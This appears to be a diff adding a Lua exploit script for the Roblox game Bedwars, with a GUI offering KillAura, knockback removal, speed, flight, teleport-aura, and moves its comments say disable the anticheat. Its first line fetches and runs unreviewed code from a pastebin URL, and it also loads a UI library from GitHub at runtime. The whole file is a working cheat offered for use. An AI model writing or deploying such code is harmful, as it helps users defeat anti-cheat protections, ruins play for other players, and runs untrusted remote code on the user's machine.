@@ -1,0 +1,256 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/PRvL4Fib"))()
+wait()
+local KnockbackTable = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Moon 1.0 | Bedwars", "DarkTheme")
+local lplr = game.Players.LocalPlayer
+local Combat = Window:NewTab("Combat")
+local Movement = Window:NewTab("Movement")
+local Other = Window:NewTab("Other")
+local Bypasses = Window:NewTab("Bypasses")
+
+local CombatSection = Combat:NewSection("Combat")
+local MovementSection = Movement:NewSection("Movement")
+local OtherSection = Other:NewSection("Other")
+local BypassesSection = Bypasses:NewSection("Bypasses")
+
+CombatSection:NewButton("KillAura", "KillAura", function()
+    local player = game:GetService("Players")
+	local lplr = player.LocalPlayer
+	local cam = workspace.CurrentCamera
+	local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
+	local SwordCont = KnitClient.Controllers.SwordController
+
+	local aura = false
+	local DistVal = {["Value"] = 14}
+	function Aura()
+		for i,v in pairs(game.Players:GetChildren()) do
+			if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("HumanoidRootPart") then
+				local mag = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+				if mag <= DistVal["Value"] and v.Team ~= game.Players.LocalPlayer.Team and v.Character:FindFirstChild("Humanoid") then
+					if v.Character.Humanoid.Health > 0 then
+						aura = true
+						SwordCont:swingSwordAtMouse()
+					end
+				end
+			end
+		end
+	end
+
+	game:GetService("RunService").Stepped:connect(function()
+		Aura()
+	end)
+end)
+
+CombatSection:NewToggle("Velocity","Reduces knockback taken",function(state)
+    if state then
+        KnockbackTable["kbDirectionStrength"] = 0
+        KnockbackTable["kbUpwardStrength"] = 0
+    else
+        KnockbackTable["kbDirectionStrength"] = 100
+        KnockbackTable["kbUpwardStrength"] = 100
+    end
+end)
+
+MovementSection:NewToggle("Speed | CFrame", "CFrame", function(state)
+    if state then
+        Speed = 0.2 
+
+_G.Speed = true
+
+You = game.Players.LocalPlayer.Name
+UIS = game:GetService("UserInputService")
+
+while _G.Speed do
+   if UIS:IsKeyDown(Enum.KeyCode.W) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,-Speed)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.A) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Speed,0,0)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.S) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,Speed)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.D) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
+   end;
+wait()
+end
+    else
+        Speed = 0.2 
+
+_G.Speed = false
+
+You = game.Players.LocalPlayer.Name
+UIS = game:GetService("UserInputService")
+
+while _G.Speed do
+   if UIS:IsKeyDown(Enum.KeyCode.W) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,-Speed)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.A) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Speed,0,0)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.S) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,Speed)
+   end;
+   if UIS:IsKeyDown(Enum.KeyCode.D) then
+       game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
+   end;
+wait()
+end
+    end
+end)
+
+MovementSection:NewKeybind("HighJump | Velocity", "Gravity", Enum.KeyCode.H, function()
+    local Velocity = Instance.new("BodyVelocity",game.Players.LocalPlayer.Character.HumanoidRootPart)
+    Velocity.Name = "Velocity1"
+    Velocity.Velocity = Vector3.new(0,500,0)
+    game.Workspace.Gravity = 0
+    wait(2)
+    game.Workspace.Gravity = 192.6
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity1:Destroy()
+end)
+
+MovementSection:NewKeybind("LongJump | Gravity", "Gravity", Enum.KeyCode.J, function()
+	game.Workspace.Gravity = 10
+    wait(2.2)
+    game.Workspace.Gravity = 192.6
+end)
+
+MovementSection:NewButton("NoFall", "NoFall", function()
+    while true do
+        wait(0.0001)
+        game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.GroundHit:FireServer()
+    end
+end)
+
+MovementSection:NewButton("Antivoid", "Wow", function()
+	local e = Instance.new("Part",workspace)
+	e.Size = Vector3.new(99999999,2,999999999999)
+	e.Position = Vector3.new(0,29,0)
+	e.Anchored = true
+	
+	local function PlayerTouched(Part)
+		local Parent = Part.Parent
+		if game.Players:GetPlayerFromCharacter(Parent) then
+			for i = 1,30 do wait()
+				Parent.HumanoidRootPart.CFrame = Parent.HumanoidRootPart.CFrame + Vector3.new(0,0.4,0)
+			end
+			
+		end
+	end
+
+	e.Touched:connect(PlayerTouched)
+		
+end)
+
+OtherSection:NewKeybind("Open/Close GUI", "Open/Close GUI", Enum.KeyCode.RightShift, function()
+	Library:ToggleUI()
+end)
+
+BypassesSection:NewButton("TPAura | TEAM", "TPAura", function()
+    lplr = game.Players.LocalPlayer
+local cam = workspace.CurrentCamera
+local oldchar
+local clone
+
+oldchar = lplr.Character
+oldchar.Archivable = true
+clone = oldchar:Clone()
+oldchar.PrimaryPart.Anchored = false
+
+local humc = oldchar.Humanoid:Clone()
+humc.Parent = lplr.Character
+
+cam.CameraSubject = clone.Humanoid 
+clone.Parent = workspace
+
+while true do wait(1)
+    local Players = game.Players:GetPlayers() -- Gets a list of players in the server
+    cam.CameraSubject = clone.Humanoid
+    local nplrs = #Players -- Prepares variables for next line
+    Randomplayer = Players[math.random(1, nplrs)] -- pick random player to teleport to
+    if Randomplayer.Team == game.Players.LocalPlayer.Team then -- line 5 to 7 prevent it from picking you
+        Randomplayer = Players[math.random(1, nplrs)]
+    end
+
+
+    local TargetCF = Randomplayer.Character.HumanoidRootPart.Position -- gets the random players position
+    local part = Instance.new("Part",workspace) -- creates a storage to store the randomplayers postion
+    part.Position = TargetCF -- sets the position
+    part.Transparency = 1 -- makes the location invisible
+    local character = game.Players.LocalPlayer.Character -- tells the game what the player is
+    character.HumanoidRootPart.CFrame = CFrame.new(133230000,10332323000,1003232200) -- disables the anticheat for 2 seconds
+    task.wait(1) -- part of disabler
+    character.PrimaryPart = part -- teleport
+    part.Position = TargetCF -- teleport
+    character.HumanoidRootPart.CFrame = part.CFrame
+    character.HumanoidRootPart.CFrame = part.CFrame
+    character.PrimaryPart = character.HumanoidRootPart
+
+
+    part:Destroy()
+    wait(7)
+end
+end)
+
+BypassesSection:NewButton("TP Player | Damc", "TP Player", function()
+    local Players = game.Players:GetPlayers() -- Gets a list of players in the server
+    cam.CameraSubject = clone.Humanoid
+    local nplrs = #Players -- Prepares variables for next line
+    Randomplayer = Players[math.random(1, nplrs)] -- pick random player to teleport to
+    if Randomplayer.Team == game.Players.LocalPlayer.Team then -- line 5 to 7 prevent it from picking you
+        Randomplayer = Players[math.random(1, nplrs)]
+    end
+
+
+    local TargetCF = Randomplayer.Character.HumanoidRootPart.Position -- gets the random players position
+    local part = Instance.new("Part",workspace) -- creates a storage to store the randomplayers postion
+    part.Position = TargetCF -- sets the position
+    part.Transparency = 1 -- makes the location invisible
+    local character = game.Players.LocalPlayer.Character -- tells the game what the player is
+    character.HumanoidRootPart.CFrame = CFrame.new(133230000,10332323000,1003232200) -- disables the anticheat for 2 seconds
+    task.wait(1) -- part of disabler
+    character.PrimaryPart = part -- teleport
+    part.Position = TargetCF -- teleport
+    character.HumanoidRootPart.CFrame = part.CFrame
+    character.HumanoidRootPart.CFrame = part.CFrame
+    character.PrimaryPart = character.HumanoidRootPart
+
+
+    part:Destroy()
+end)
+
+BypassesSection:NewButton("FastFly | Damc", "FastFly", function()
+    local player = game.Players.LocalPlayer
+local character = game.Players.LocalPlayer.Character
+local storedpos
+
+local mouse = player:GetMouse()
+
+-- Settings
+
+bind = "r" -- has to be lowercase
+
+-- Script
+
+mouse.KeyDown:connect(function(key)
+    if key == bind then
+        storedpos = player.Character.HumanoidRootPart.CFrame
+        character.HumanoidRootPart.CFrame = CFrame.new(1043500,145000,10053450)
+        wait(0.7)
+        player.Character.HumanoidRootPart.CFrame = storedpos
+        local chr = player.Character or player.CharacterAdded:Wait()
+        local hrp = chr:WaitForChild("HumanoidRootPart")
+
+
+
+        workspace.Gravity = 10
+        for i = 1,30 do wait(0.000000002)
+            hrp.CFrame = hrp.CFrame + hrp.CFrame.LookVector * 5
+        end
+        workspace.Gravity = 196.2
+    end
+end)
+end)
